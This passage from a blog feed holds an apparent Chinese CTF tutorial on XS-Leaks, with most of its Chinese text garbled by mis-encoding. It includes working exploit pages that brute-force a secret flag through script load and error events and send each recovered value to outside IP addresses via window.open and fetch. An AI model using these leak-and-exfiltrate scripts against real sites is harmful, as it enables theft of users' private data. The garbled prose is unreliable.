`http://0.0.0.0:8000/internal/search?s=$&#123;currentFlag&#125;$&#123;char&#125;`;</span><br><span class="line"></span><br><span class="line">                script.onload = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(true);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                script.onerror = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(false);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                document.head.appendChild(script);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        async function bruteforce() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (!currentFlag.endsWith(&#x27;&#125;&#x27;)) &#123;</span><br><span class="line">                    for (let char of chars) &#123;</span><br><span class="line">                        const isCorrect = await checkCharacter(char);</span><br><span class="line">                        if (isCorrect) &#123;</span><br><span class="line">                            currentFlag += char;</span><br><span class="line">                            window.open(`http://8.130.172.38:8000/?flag=$&#123;currentFlag&#125;`);</span><br><span class="line">                            await sleep(50);</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        await sleep(50);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                window.open(`http://8.130.172.38:8000/?error=$&#123;currentFlag&#125;`);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bruteforce();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XS-Leakså­¦ä¹ </title>
      <link href="/2025/04/07/XS-Leaks%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/07/XS-Leaks%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>XS-Leaks å…¨ç§° Cross-site leaksï¼Œå¯ä»¥ç”¨æ¥ <strong>æ¢æµ‹ç”¨æˆ·æ•æ„Ÿä¿¡æ¯</strong>ã€‚</p><p>è®¾æƒ³ç½‘ç«™å­˜åœ¨ä¸€ä¸ªæ¨¡ç³ŠæŸ¥æ‰¾åŠŸèƒ½ï¼ˆè‹¥å‰ç¼€åŒ¹é…åˆ™è¿”å›å¯¹åº”ç»“æœï¼‰ä¾‹å¦‚ <code>http://localhost/search?query=</code>ï¼Œé¡µé¢æ˜¯å­˜åœ¨ xss æ¼æ´ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªç±»ä¼¼ flag çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åªæœ‰ä¸åŒç”¨æˆ·æŸ¥è¯¢çš„ç»“æœé›†ä¸åŒã€‚è¿™æ—¶ä½ å¯èƒ½ä¼šå°è¯• csrfï¼Œä½†æ˜¯ç”±äºç½‘ç«™æ­£ç¡®é…ç½®äº† CORSï¼Œå¯¼è‡´æ— æ³•é€šè¿‡ xss ç»“åˆ csrf è·å–åˆ°å…·ä½“çš„å“åº”ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å°è¯• XS-Leaksã€‚</p><p>XS-Leaksï¼ˆæˆ– Cross-Site Leaksï¼‰æ˜¯ä¸€<a href="https://xsleaks.dev/">ç»„æµè§ˆå™¨ä¾§é€šé“æ”»å‡»</a>ã€‚å®ƒä»¬ä½¿æ¶æ„ç½‘ç«™èƒ½å¤Ÿä»å…¶ä»– Web åº”ç”¨ç¨‹åºçš„ç”¨æˆ·é‚£é‡Œæ¨æ–­æ•°æ®ã€‚ç›²æ³¨ä¹Ÿæ˜¯ä¸€ç§ä¾§ä¿¡é“æ”»å‡»ï¼Œå¯ä»¥è¿™ä¹ˆç†è§£ã€‚</p><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹åŒæºæ”¿ç­–ï¼Œæ­£æ˜¯å› ä¸ºå®ƒçš„å­˜åœ¨ï¼ŒXS-Leaksæ‰æœ‰å‡ºç°çš„å¿…è¦ã€‚</p><h2 id="åŒæºæ”¿ç­–"><a href="#åŒæºæ”¿ç­–" class="headerlink" title="åŒæºæ”¿ç­–"></a>åŒæºæ”¿ç­–</h2><p><a href="https://medium.com/starbugs/%E5%BC%84%E6%87%82%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-same-origin-policy-%E8%88%87%E8%B7%A8%E7%B6%B2%E5%9F%9F-cors-e2e5c1a53a19">https://medium.com/starbugs/%E5%BC%84%E6%87%82%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-same-origin-policy-%E8%88%87%E8%B7%A8%E7%B6%B2%E5%9F%9F-cors-e2e5c1a53a19</a></p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œäº†è§£ SOPï¼ˆSame Origin Policyï¼‰æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œå®ƒæ˜¯ Web æµè§ˆå™¨å®‰å…¨æ¨¡å‹çš„æ ¸å¿ƒå’Œçµé­‚ã€‚è¿™æ˜¯ä¸€ä¸ªæˆ–å¤šæˆ–å°‘è¯´çš„è§„åˆ™ï¼š</p><p>åŒæºæ”¿ç­–æ˜¯ç½‘ç«™å®‰å…¨çš„åŸºç¡€ã€‚<a href="https://domain-a.com/">https://domain-a.com</a>åªèƒ½è®¿é—®è‡ªå·±ç½‘ç«™é‡Œçš„èµ„æºï¼ˆå›¾ç‰‡ã€è§†é¢‘ã€èŠ‚ç›®ç ç­‰ï¼‰ï¼Œä¸å…è®¸ç½‘ç«™<a href="https://domain-b.com/">https://domain-b.com</a>æ¥è®¿é—®ã€‚æƒ³è¦è®¿é—®è·¨æºèµ„æºå¿…é¡»åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹æ‰è¢«å…è®¸ã€‚</p><p>å…è®¸schemeã€domainã€portéƒ½å¯ä»¥è¢«è§†ä¸ºåŒæº (same-origin)</p><blockquote><p>è‹¥ä»¥ <a href="https://domain-a.com:80/hannah-lin">https://domain-a.com:80/hannah-lin</a> åšèŒƒä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ®æ­¤åˆ¤æ–­ä¸‹åˆ—æ˜¯å¦ä¸ºåŒæº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://domain-a.com â†’ ä¸åŒæºï¼scheme ä¸åŒ</span><br><span class="line">https://domain-a.com/mike â†’ åŒæº</span><br><span class="line">https://news.domain-a.com â†’ ä¸åŒæºï¼domain ä¸åŒ</span><br><span class="line">https://domain-a.com:81 â†’ ä¸åŒæºï¼port ä¸åŒ</span><br><span class="line">https://domain-b.com â†’ ä¸åŒæºï¼domain ä¸åŒ</span><br></pre></td></tr></table></figure></blockquote><p>ä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹ç½‘ç«™æ˜æ˜å°±å¼•å…¥äº†å¾ˆå¤šè·¨æ¥æºçš„èµ„æºå•Šï¼Ÿ</p><p>æ²¡é”™ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è·¨æ¥æºæ˜¯è¢«å…è®¸çš„ï¼Œä¸å—åŒæºé™åˆ¶ç­–ç•¥ï¼</p><ul><li><strong>è·¨æ¥æºåµŒå…¥é€šå¸¸è¢«å…è®¸ ( embed )</strong></li></ul><p>åƒç¤ºä¾‹çš„<code>&lt;script src=â€â€¦â€&gt;&lt;/script&gt;</code>ã€<code>&lt;link rel=â€stylesheetâ€ href=â€â€¦â€&gt;</code>ã€<code>&lt;iframe&gt;</code>ã€å›¾ç‰‡<code>&lt;img&gt;</code>ã€<code>&lt;video&gt;</code>ã€ æˆ–è€…<code>@font-face</code> <code>&lt;object&gt;</code>ã€<code>&lt;embed&gt;</code>.ç­‰ç­‰éƒ½æ˜¯è·¨æ¥æºåµŒå…¥ã€‚</p><ul><li><strong>è·¨æ¥æºå†™å…¥é€šå¸¸è¢«å…è®¸ ( writes )</strong></li></ul><p>å¯ä»¥åœ¨ä»¥å¤ªç½‘ä¸Šç”±<code>&lt;form&gt;</code>åœ¨<code>domain-a.com</code>å‘è¯·æ±‚ç»™<code>domain-b.com</code>ï¼Œå½“ç„¶åˆ©ç”¨é“¾æ¥é“¾æ¥æˆ–ç›´æ¥é‡å®šå‘åˆ°å…¶ä»–ç½‘ç«™ä¹Ÿæ˜¯å…è®¸çš„ã€‚</p><ul><li><strong>è·¨æºè¯»å–é€šå¸¸è¢«ç¦æ­¢ ( reads )</strong></li></ul><p><code>domain-a.com</code>æ— æ³•è¯»å–<code>domain-b.com</code>cookieã€XMLHttpRequest ï¼ŒFetch API ä¹Ÿæ— æ³•è¢«è¯»å–ï¼Œä¼šè¿”å›é”™è¯¯</p><p><img src="https://miro.medium.com/v2/resize:fit:875/1*BTtIADAmDXDACtlP0MkD4g.png" alt="img"></p><h2 id="é€šè¿‡å®šæ—¶æ”»å‡»æ³„éœ²"><a href="#é€šè¿‡å®šæ—¶æ”»å‡»æ³„éœ²" class="headerlink" title="é€šè¿‡å®šæ—¶æ”»å‡»æ³„éœ²"></a>é€šè¿‡å®šæ—¶æ”»å‡»æ³„éœ²</h2><p>æµè§ˆå™¨å¯ä»¥è½»æ¾åœ°å¯¹è·¨åŸŸè¯·æ±‚è¿›è¡Œè®¡æ—¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = performance.<span class="title function_">now</span>()</span><br><span class="line"> </span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> time = performance.<span class="title function_">now</span>() - start</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The request took %d ms.&#x27;</span>, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">#<span class="title class_">The</span> request took <span class="number">129</span> ms.</span><br></pre></td></tr></table></figure><p>è¿™ä½¿å¾—æ¶æ„ç½‘ç«™å¯ä»¥åŒºåˆ†å“åº”ã€‚å‡è®¾æœ‰ä¸€ä¸ªæœç´¢ API ä¾›æ‚£è€…æŸ¥æ‰¾è‡ªå·±çš„è®°å½•ã€‚å¦‚æœæ‚£è€…æ‚£æœ‰ç³–å°¿ç—…å¹¶æœç´¢â€œç³–å°¿ç—…â€ï¼Œåˆ™æœåŠ¡å™¨è¿”å›æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/records/search?query=diabetes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#x27;records&#x27;: [&#123; &#x27;id&#x27;: 1, ... &#125;] &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‚£è€…æ²¡æœ‰ç³–å°¿ç—…ï¼ŒAPI ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ JSONã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/records/search?query=diabetes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#x27;records&#x27;: [] &#125;</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´ï¼Œå‰ä¸€ä¸ªè¯·æ±‚éœ€è¦æ›´é•¿çš„æ—¶é—´ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œå¯¹â€œdiabetesâ€ URL çš„è¯·æ±‚è¿›è¡Œè®¡æ—¶ï¼Œå¹¶ç¡®å®šç”¨æˆ·æ˜¯å¦æ‚£æœ‰ç³–å°¿ç—…ã€‚</p><h2 id="é€šè¿‡åŸºäºé”™è¯¯çš„æ”»å‡»"><a href="#é€šè¿‡åŸºäºé”™è¯¯çš„æ”»å‡»" class="headerlink" title="é€šè¿‡åŸºäºé”™è¯¯çš„æ”»å‡»"></a>é€šè¿‡åŸºäºé”™è¯¯çš„æ”»å‡»</h2><p>æˆ‘ä»¬åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªä¾§é€šé“æ˜¯ä½¿ç”¨ JavaScript ç­–ç•¥æ€§åœ°æ•è·é”™è¯¯æ¶ˆæ¯ã€‚å‡è®¾ä¸€ä¸ªé¡µé¢æ ¹æ®ä¸€äº›æ•æ„Ÿçš„ç”¨æˆ·æ•°æ®è¿”å›<code>200 OK</code>æˆ–ã€‚<code>404 not found</code></p><p>ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºå¦‚ä¸‹æ‰€ç¤ºçš„é¡µé¢ï¼Œè¯¥é¡µé¢æŸ¥è¯¢åº”ç”¨ç¨‹åºå¹¶ç¡®å®šç«¯ç‚¹æ˜¯å¦ä¸ºæµè§ˆå™¨ç”¨æˆ·è¿”å›é”™è¯¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkError</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">  script.<span class="property">src</span> = url</span><br><span class="line">  script.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] GET <span class="subst">$&#123;url&#125;</span> succeeded.`</span>)</span><br><span class="line">  script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[-] GET <span class="subst">$&#123;url&#125;</span> returned error.`</span>)</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">checkError</span>(<span class="string">&#x27;https://www.example.com/&#x27;</span>)</span><br><span class="line"><span class="title function_">checkError</span>(<span class="string">&#x27;https://www.example.com/this-does-not-exist&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] GET https://www.example.com/ succeeded.</span><br><span class="line">[+] GET https://www.example.com/this-does-not-exist returned error.</span><br></pre></td></tr></table></figure><p>ä¸ªäººè®¤ä¸ºè¿™è·Ÿå¸ƒå°”ç›²æ³¨å¾ˆåƒï¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    function checkError(url) &#123;</span><br><span class="line">        let script = document.createElement(&#x27;script&#x27;)</span><br><span class="line">        script.src = url</span><br><span class="line">        script.onload = () =&gt; window.open(&quot;http://101.43.48.199:8000/1&quot;);</span><br><span class="line">        script.onerror = () =&gt; window.open(&quot;http://101.43.48.199:8000/2&quot;);</span><br><span class="line">        document.head.appendChild(script)</span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=nctf&#123;&#x27;)</span><br><span class="line">      checkError(&#x27;http://0.0.0.0:8000/internal/search?s=somethingwrong&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç»™å‡ºä¸€ä¸ªç›¸å…³expï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        let currentFlag = &quot;nctf&#123;&quot;;</span><br><span class="line">        const chars = &quot;abcdef0123456789-&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        function sleep(ms) &#123;</span><br><span class="line">            return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function checkCharacter(char) &#123;</span><br><span class="line">            return new Promise((resolve) =&gt; &#123;</span><br><span class="line">                let script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">                script.src = `http://0.0.0.0:8000/internal/search?s=$&#123;currentFlag&#125;$&#123;char&#125;`;</span><br><span class="line"></span><br><span class="line">                script.onload = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(true);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                script.onerror = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(false);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                document.head.appendChild(script);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        async function bruteforce() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (!currentFlag.endsWith(&#x27;&#125;&#x27;)) &#123;</span><br><span class="line">                    for (let char of chars) &#123;</span><br><span class="line">                        const isCorrect = await checkCharacter(char);</span><br><span class="line">                        if (isCorrect) &#123;</span><br><span class="line">                            currentFlag += char;</span><br><span class="line">                            window.open(`http://VPS:8000/?flag=$&#123;currentFlag&#125;`);</span><br><span class="line">                            await sleep(50);</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        await sleep(50);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                window.open(`http://VPS:8000/?error=$&#123;currentFlag&#125;`);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bruteforce();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†æ¥ä¸€ä¸ªï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span><br><span class="line"><span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line">script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://156.238.233.113:8000/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>:<span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line"><span class="title function_">leak</span>(flag);</span><br><span class="line">script.<span class="title function_">remove</span>();</span><br><span class="line">&#125;;</span><br><span class="line">script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="keyword">let</span> char = dicts[i];</span><br><span class="line"><span class="title function_">probeError</span>(flag + char);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">leak</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡å¸§è®¡æ•°æ³„éœ²"><a href="#é€šè¿‡å¸§è®¡æ•°æ³„éœ²" class="headerlink" title="é€šè¿‡å¸§è®¡æ•°æ³„éœ²"></a>é€šè¿‡å¸§è®¡æ•°æ³„éœ²</h2><p><a href="https://xsleaks.dev/docs/attacks/frame-counting/">https://xsleaks.dev/docs/attacks/frame-counting/</a></p><p>é€šè¿‡è·å–å¸§çš„å¥æŸ„ï¼Œå¯ä»¥è®¿é—®è¯¥å¸§çš„window.lengthå±æ€§ï¼Œè¯¥å±æ€§ç”¨äºæ£€ç´¢çª—å£ä¸­çš„å¸§æ•°ï¼ˆIFRAME æˆ– FRAMEï¼‰ã€‚</p><p>è¿™ç§çŸ¥è¯†æœ‰æ—¶ä¼šäº§ç”Ÿå®‰å…¨&#x2F;éšç§å½±å“ã€‚ä¾‹å¦‚ï¼Œç½‘ç«™å¯èƒ½ä¼šæ ¹æ®æŸäº›ç”¨æˆ·æ•°æ®ä»¥ä¸åŒçš„å¸§æ•°å‘ˆç°ä¸ªäººèµ„æ–™é¡µé¢ã€‚</p><p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥è·å¾—çª—å£å¥æŸ„ã€‚ç¬¬ä¸€ä¸ªæ˜¯è°ƒç”¨window.openï¼Œå®ƒè¿”å›å¥æŸ„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://example.com&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Waiting 3 seconds for page to load...&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%d FRAME/IFRAME elements detected.&#x27;</span>, win.<span class="property">length</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯å¯¹ç›®æ ‡ç½‘ç«™è¿›è¡Œæ¡†æ¶ï¼Œå¹¶è·å–æ¡†æ¶çš„å¥æŸ„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=<span class="string">&quot;framecounter&quot;</span> src=<span class="string">&quot;https://www.example.com&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="property">frames</span>.<span class="property">framecounter</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Waiting 3 seconds for page to load...&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%d FRAME/IFRAME elements detected.&#x27;</span>, win.<span class="property">length</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;, <span class="number">3000</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºç›¸å…³æ¯”èµ›çš„poc</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// contentWindow.frames.length</span></span><br><span 